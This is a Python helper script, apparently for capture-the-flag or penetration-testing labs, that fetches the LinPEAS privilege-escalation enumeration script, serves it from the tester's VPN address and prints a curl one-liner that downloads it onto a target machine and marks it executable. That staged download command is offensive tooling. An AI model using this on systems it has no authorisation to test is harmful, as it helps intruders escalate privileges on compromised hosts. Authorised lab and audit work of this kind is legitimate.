import requests
import os
import argparse
import socketserver
import threading
import netifaces as ni
from utils.security import SecurityHTTPRequestHandler
import psutil
import json

# get config
with open("./config.json", "r") as f:
    config = json.load(f)

LINPEAS_URL = config["LINPEAS_URL"]
DEFAULT_PORT = config["DEFAULT_PORT"]
DEFAULT_INTERFACE = config["DEFAULT_INTERFACE"]

def get_linpeas():
    linpeas_contents = requests.get(LINPEAS_URL)

    if linpeas_contents.status_code != 200:
        print("Error while getting Linpeas!")
        return

    # Assemble     
    path_list = os.path.realpath(__file__).split("/")[1:-1]
    path = ""
    
    for p in path_list:
        path += "/"+p

    with open(f"{path}/l.sh", "w") as f:
        f.write(linpeas_contents.content.decode('utf-8'))

    print(f"Saved to {path}/l.sh")

def serve(port):
    handler = SecurityHTTPRequestHandler

    with socketserver.TCPServer(("", port), handler) as httpd:
        httpd.serve_forever()

def get_interface():
    # this isnt perfect but will work

    interfaces = psutil.net_if_addrs()

    if DEFAULT_INTERFACE in interfaces.keys():
        return DEFAULT_INTERFACE

    return next(iter(interfaces.keys()))

def main():

    # Step 0: parse arguments
    parser = argparse.ArgumentParser(description='Provide the newest version of Linpeas!')

    parser.add_argument('--port', 
                        dest='port', 
                        default=DEFAULT_PORT,
                        type=int,
                        help='The port which will be used. (--port=1337)')
    
    parser.add_argument('--inf', 
                        dest='interface', 
                        default=DEFAULT_INTERFACE,
                        help='The network interface of the OpenVPN connection. (--inf=utun7)')
    
    parser.add_argument('--no-renew',
                        dest='no_renew',
                        action="store_false",
                        help='If it should get the newest version of Linpeas.')

    args = parser.parse_args()

    port = args.port
    interface = args.interface
    renew_linpeas = args.no_renew

    # Step 1: get Linpeas
    if renew_linpeas:
        print("Getting Linpeas...")
        get_linpeas()

    # Step 2: provide linpeas
    t = threading.Thread(target=serve, args=(port,))
    t.start()

    # Step 3: get IP from OpenVPN Connection
    ip = ni.ifaddresses(get_interface())[ni.AF_INET][0]['addr']

    # Step 4: provide user with information
    print(f"Get linpeas with: curl -L http://{ip}:{port}/l.sh > l.sh | chmod +x l.sh")

if __name__ == "__main__":
    main()
